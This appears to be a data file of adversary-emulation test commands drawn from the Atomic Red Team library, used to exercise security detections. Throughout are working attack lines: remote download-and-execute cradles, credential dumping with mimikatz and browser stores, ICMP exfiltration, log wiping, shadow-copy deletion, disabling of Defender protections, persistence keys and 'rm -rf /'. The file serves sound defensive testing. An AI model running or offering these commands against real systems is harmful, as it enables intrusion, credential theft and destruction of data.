#{regsvr32path}\#{regsvr32name} /s /u /i:"#{filename}" scrobj.dll
powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&  fi&&done&&rm -rf /var/spool/mail/copy/*
echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules&&grep "# THIS IS A COMMENT" /etc/ufw/user.rules
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
sdbinst.exe "#{file_path}"
Add-Type -AssemblyName System.IdentityModel;$ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN" 
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel";New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security";New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f
which_python=$(which python || which python3 || which python3.9 || which python2)&&$which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures;bcdedit.exe /set {default} recoveryenabled no
New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value Administrator -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Value contoso.com -Force;New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword  -Value password1 -Force
for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  
system_profiler&&ls -al /Applications
service pf stop&&service pf disable
sudo defaults read /Library/Preferences/com.apple.alf&&sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
echo ifconfig | pbcopy&&$(pbpaste)
rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');bluekeep -noninteractive -consoleoutput
cp /bin/sh /tmp/crond;&&echo 'sleep 5' | /tmp/crond
Copy "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam" "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"        ;Start-Process "Excel"
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe;$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe";Start-Process -Wait $file1 /S; ;Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
rm -rf /var/log/messages&&rm -rf /var/log/security
[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
dscl . list /Groups&&dscl . list /Users&&dscl . list /Users | grep -v '_'&&dscacheutil -q group&&dscacheutil -q user
query user /SERVER:#{computer_name}
cd ~/Library/Cookies&&grep -q "#{search_string}" "Cookies.binarycookies"
sc.exe create #{service_name} binPath= "#{executable_command}";sc.exe start #{service_name};sc.exe delete #{service_name}
ipconfig /all;net config workstation;net view /all /domain;nltest /domain_trusts
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
klist purge;cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
cat /etc/pam.d/common-password
cd "PathToAtomicsFolder\..\ExternalPayloads";Start-Process .\BadPotato.exe notepad.exe;Start-Sleep -Second 20;Stop-Process -Name "notepad" -force -erroraction silentlycontinue;Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
export AWS_REGION=#{aws_region} &&cd #{stratus_path}&&echo "starting warmup"&&./stratus warmup aws.defense-evasion.cloudtrail-event-selectors&&echo "starting detonate"&&./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force
IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}';New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dll_path}";New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String";Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 0 /F;reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 0 /F
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}&&echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}&&echo "" >> #{systemd_service_path}/#{systemd_service_file}&&echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}&&echo "Type=simple"&&echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}&&echo "" >> #{systemd_service_path}/#{systemd_service_file}&&echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}&&echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}&&systemctl daemon-reload&&systemctl enable #{systemd_service_file}&&systemctl start #{systemd_service_file}
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
touch #{file_to_setcap}&&sudo setcap cap_setuid=ep #{file_to_setcap}
[ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"&&ART=$(echo -n "id" | $encodecmd)&&echo "\$ART=$ART"&&echo -n "$ART" | $decodecmd |/bin/bash&&unset ART
net user administrator /domain
Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\" | findstr Windows;Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce";Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce";Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices";Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices";Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify";Get-Item -Path "HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit";Get-Item -Path "HKCU:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell";Get-Item -Path "HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell";Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad";Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce";Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx";Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Run";Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\Run";Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce";Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run";Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run";Get-ChildItem -Path "HKLM:system\currentcontrolset\services" ;Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Run";Get-Item -Path "HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot";Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components";Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"
Start-Process "#{script_path}"
sudo #{program_path} -4 -P -p 17 -t 3
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 0 /f
Get-AdComputer -Filter *
$path = "HKCU:\Software\Microsoft\Command Processor";if (!(Test-Path -path $path)){;  New-Item -ItemType Key -Path $path;};New-ItemProperty -Path $path -Name "AutoRun" -Value "#{command}" -PropertyType "String"
rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
import-module "#{file_path}\timestomp.ps1";timestomp -dest "#{file_path}\kxwn.lock"
sudo touch #{file_to_setuid}&&sudo chown root #{file_to_setuid}&&sudo chmod g+xs #{file_to_setuid}
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -gcb -sc trustdmp
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');kittenz -consoleoutput -noninteractive
Start-Process "#{RemotePC_Path}"
([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y;cmd.exe /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
"#{lazagne_path}" browsers
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y;cmd.exe /c %APPDATA%\notepad.exe /B
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | out-null
$error.clear();Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue;if($error) {echo "Virtualization Environment detected"}
/usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist&&/usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
vaultcmd /listcreds:"Web Credentials" /all
sudo dscl . -create /Users/#{user_name} IsHidden 1
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi;$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi";Start-Process -Wait $file1 /quiet;;Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}
&"#{renamed_binary}" "#{xml_payload}" output.txt
rundll32.exe #{input_file}, StartW
echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> #{output_file} \;&&cat #{output_file} 2>/dev/null
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
tasklist
wmic process get caption,executablepath,commandline /format:csv
iptables-save > /tmp/iptables.rules&&iptables -D OUTPUT -p tcp --dport 21 -j DROP
touch #{file_to_modify}&&chflags simmutable #{file_to_modify}&&chflags nosimmutable #{file_to_modify}
ipconfig /all;netsh interface show interface;arp -a;nbtstat -n;net config
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
rundll32.exe url.dll,OpenURL "PathToAtomicsFolder\T1218.011\src\index.hta";rundll32.exe URL.dll,FileProtocolHandler "PathToAtomicsFolder\T1218.011\src\akteullen.vbs"
useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art&&su art&&cd /tmp&&curl -s #{remote_url} |bash
dir c:\ /b /s .key | findstr /e .key
sudo #{program_path} -f -i #{ifname} -t 3
netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
net localgroup;net group /domain;net group "enterprise admins" /domain;net group "domain admins" /domain
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ;certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
copy "#{inputfile}" #{outputfile};$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id;Stop-Process -ID $myT1036_003
vssadmin.exe delete shadows /all /quiet
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y;cmd.exe /K %APPDATA%\taskhostw.exe
# Creates GUI to prompt for password. Expect long pause before prompt is available.    ;$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.;write-warning $cred.GetNetworkCredential().Password
$startingDirectory = "#{starting_directory}";$outputZip = "#{output_zip_folder_path}";$fileExtensionsString = "#{file_extensions}" ;$fileExtensions = $fileExtensionsString -split ", ";;New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null;;Function Search-Files {;  param (;    [string]$directory;  );  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {;    $fileExtensions -contains $_.Extension.ToLower();  };  return $files;};;$foundFiles = Search-Files -directory $startingDirectory;if ($foundFiles.Count -gt 0) {;  $foundFilePaths = $foundFiles.FullName;  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip";;  Write-Host "Zip file created: $outputZip\data.zip";  } else {;      Write-Host "No files found with the specified extensions.";  }
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
hostname
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f
"#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -File | ForEach-Object { Add-Content -Path $_.FullName -Value "Modification for Atomic Red Test" -ErrorAction Ignore }
set
Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments "#{input_file}" -SmtpServer #{smtp_server}
[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
$Target = "C:\Windows\System32\calc.exe";$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk";$WScriptShell = New-Object -ComObject WScript.Shell;$Create = $WScriptShell.CreateShortcut($ShortcutLocation);$Create.TargetPath = $Target;$Create.Save()      
mkdir -p #{test_folder}&&cd #{test_folder}; touch a b c d e f g&&zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*&&echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip&&ls -l #{test_folder}
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads";Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
net user /domain;net group /domain
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan;IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');;Invoke-BloodHound -OutputDirectory $env:Temp;Start-Sleep 5
touch #{file_to_setuid}&&chown root #{file_to_setuid}&&chmod u+xs #{file_to_setuid}
#{msi_exe} /q /#{action} "#{msi_payload}"
wmic cpu get name;wmic MEMPHYSICAL get MaxCapacity;wmic baseboard get product;wmic baseboard get version;wmic bios get SMBIOSBIOSVersion;wmic path win32_VideoController get name;wmic path win32_VideoController get DriverVersion;wmic path win32_VideoController get VideoModeDescription;wmic OS get Caption,OSArchitecture,Version;wmic DISKDRIVE get Caption;Get-WmiObject win32_bios
Connect-AzureAD;$userprincipalname = "#{userprincipalname}";Remove-AzureADUser -ObjectId $userprincipalname
New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force
truncate -s 0 /var/log/messages #size parameter shorthand&&truncate --size=0 /var/log/security #size parameter 
New-LocalUser -Name "Administrator " -NoPassword
net user;get-localuser;get-localgroupmember -group Users;cmdkey.exe /list;ls C:/Users;get-childitem C:\Users\;dir C:\Users\;get-localgroup;net localgroup
Write-Host "Creating system environment variables" -ForegroundColor Cyan;New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null;New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null;New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
echo "block in proto tcp from 1.2.3.4 to any" | pfctl -a pf-rules -f -&&pfctl -a pf-rules -s rules
del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} "#{replace_cab}" %TEMP% /A
[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art&&cat /etc/passwd |grep ^art&&chsh -s /bin/sh art&&cat /etc/passwd |grep ^art
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
get-wmiObject -class Win32_Process
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
halt --reboot
Invoke-Expression "#{adrecon_path}"
NOW=$(date +%m%d%H%M%Y)&&date 010100001971&&touch #{target_filename}&&date "$NOW"&&stat #{target_filename}
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-ExchangeOnline -Credential $creds;$test = Get-AntiPhishRule;Disable-AntiPhishRule -Identity $test.Name -Confirm:$false;Get-AntiPhishRule
$file = Get-Item $env:temp\T1564.001-9.txt -Force;$file.attributes='Hidden'
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');shareenumeration -noninteractive -consoleoutput
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
